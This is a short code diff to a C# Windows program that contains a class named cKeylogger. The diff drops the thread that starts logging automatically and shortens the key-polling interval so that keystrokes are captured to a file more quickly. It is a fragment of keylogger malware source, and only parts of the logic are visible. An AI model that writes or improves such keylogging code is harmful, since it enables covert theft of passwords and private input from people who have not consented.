@@ -3,7 +3,6 @@ using System.Text;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
-using System.Threading;
 
 namespace Overwatch
 {
@@ -33,7 +32,6 @@ namespace Overwatch
 
         private const int MAX_STRING_BUILDER = 256;
         private const bool DEBUG = true;
-        public Thread KeyTread;
         private StreamWriter writer;
         private int counter;
         string path;
@@ -41,8 +39,6 @@ namespace Overwatch
     public cKeylogger()
         {
             counter = 0;
-            KeyTread = new Thread(start);
-            KeyTread.Start();
         }
         internal void start()
         {
@@ -107,7 +103,7 @@ namespace Overwatch
 
                     }
                     writer.Flush();
-                    System.Threading.Thread.Sleep(55);
+                    System.Threading.Thread.Sleep(25);
                 }
             }
         }
